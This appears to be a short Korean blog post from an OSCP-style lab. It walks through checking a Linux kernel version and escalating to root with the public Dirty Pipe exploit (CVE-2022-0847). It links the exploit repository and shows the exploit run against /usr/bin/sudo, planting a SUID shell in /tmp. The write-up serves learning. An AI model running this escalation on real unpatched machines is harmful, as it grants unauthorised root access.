---
layout: post
title: Dirtypipe 취약점
subtitle: 리눅스 커널 취약점을 이용한 권한상승
category: knowledge
thumbnail-img: /assets/img/knowledge/dirtypipe.png
tags: [linux, dirtypipe, kernel, CVE-2022-0847]
author: Hong
---
# 커널 버전 확인
아래의 명령어로 리눅스 커널의 버전을 확인한다.
```
cat /etc/issue
Ubuntu 20.04.5 LTS \n \l

uname -r
5.9.0-050900-generic

uname -a
Linux oscp 5.9.0-050900-generic #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
항상 보던것과는 다른 듯한 버전..

취약점을 검색해보면 아래와 같이 dirtypipe 취약점이라는 것을 알게 된다.

[CVE-2022-0847 dirtypipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)

# 취약점 컴파일 후 실행
위의 소스코드는 컴파일을 할 필요가 있다.

이번엔 타겟 머신에 gcc와 git이 있는 것을 활용해서 직접 git clone한 후 컴파일 했다.

```
/tmp/CVE-2022-0847-DirtyPipe-Exploits$ ./exploit-2 /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root
```
페이로드로 sudo를 실행하는 것만으로 root권한을 획득했다!

커널 버전을 항상 눈여겨 볼 것.